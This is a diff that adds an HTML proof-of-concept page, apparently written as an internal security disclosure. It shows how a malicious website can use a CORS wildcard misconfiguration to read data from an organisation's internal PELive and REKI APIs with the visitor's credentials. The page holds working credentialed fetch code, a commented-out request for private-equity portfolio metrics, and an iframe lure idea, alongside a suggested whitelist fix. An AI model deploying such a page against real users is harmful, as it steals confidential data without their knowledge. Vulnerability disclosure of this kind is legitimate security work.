@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>PELIVE XSRF Proof of Concept</title>
+  </head>
+  <body>
+    <p>Hi <span id="user"></span></p>
+    <h2>What is this?</h2>
+    <p>
+      This is a demo of how a website, hosted outside GIC, can steal data from REKI APIs.
+      All that is needed is for a user that has access to REKI to visit this website (maybe via link)
+      
+      On doing so, the website will be able to get information from REKI.
+      
+      For example, by visiting this website, I am able to retrieve this from the REKI. I can then send this
+      information to any server that I control, without you noticing.
+    </p>
+    <p id="result">Loading</p>
+    <p>I am also able to retrieve the following information from the Pipeline API</p>
+    <p id="deal">Loading...</p>
+
+    <h2>How this works:</h2>
+    
+    <ol>
+      <li>User visits malicious website</li>
+      <li>Website executes javascript</li>
+      <li>Javascript makes a request to https://pelive.gic.com.sg, using the user's windows credentials</li>
+      <li>Because PELive receives the user's credentials, it sends the information readily (even though the website isn't PELive</li>
+    </ol>
+    
+    <h2>How this can be exploited</h2>
+    
+    <p>User can be sent a link to a website that hosts another website in an iframe, i.e. Financial Times. It will look
+      like the user is visiting a legitimate website, but the website will be stealing your data in the background
+    
+    <p>Example, <a href="iframe">view this article on Financial Times</a>. </p>
+    
+    <h2>How to fix</h2>
+    <p>Change APIs such that CORS uses a whitelist of *.gic.com.sg instead of a wildcard *. We can also add an exception for localhost</p>
+    
+    <script>
+      var body = {
+        Name: "Aggregated",
+        Queries: [
+          {
+            Name: "Data",
+            Fields: [
+              "Market Value",
+              "Portfolio Size",
+              "IRR Horizon",
+              "MOC",
+              "DPI",
+              "IRR",
+              "Cum. DVA - No Cash (Hedged USD)",
+              "Commitment",
+              "Drawdown",
+              "Undrawn Commitment",
+              "Distribution",
+              "Gain/Loss",
+              "As At Date"
+            ],
+            Filters: {
+              "As At Date": { values: ["2018-12-31"] },
+              Currency: { values: ["USD"] },
+              Horizon: { values: ["Since Incept"] },
+              "Is Aborted Deal": { values: ["NO"] },
+              Strategy: { values: ["PE"] }
+            }
+          }
+        ]
+      };
+
+      function msg(e) {
+        var result = e[0].Total[0].Metrics;
+
+        document.getElementById("result").innerHTML =
+          "<pre>" + JSON.stringify(result, undefined, 2) + "</pre>";
+      }
+
+      fetch("https://pelive.gic.com.sg/cube/api/v1/User", {
+        credentials: "include"
+      }).then(resp =>
+        resp.json().then(e => {
+          document.getElementById("user").innerHTML = e.name;
+        })
+      );
+
+      fetch(
+        "https://rekidp01.gic.com.sg/api/factsheet/getAllProjectsWithIDAndName",
+        { credentials: "include" }
+      ).then(resp =>
+        resp.json().then(e => {
+          document.getElementById("result").innerHTML =
+            "<pre>" + JSON.stringify(e.value[0], undefined, 2) + "</pre>";
+        })
+      );
+
+//       fetch("https://pelive.gic.com.sg/cube/api/v1/SIX", {
+//         credentials: "include",
+//         body: JSON.stringify(body),
+//         method: "POST",
+//         headers: {
+//           Accept: "application/json",
+//           "Content-Type": "application/json; charset=utf-8"
+//         }
+//       }).then(resp => resp.json().then(msg));
+    </script>
+  </body>
+</html>
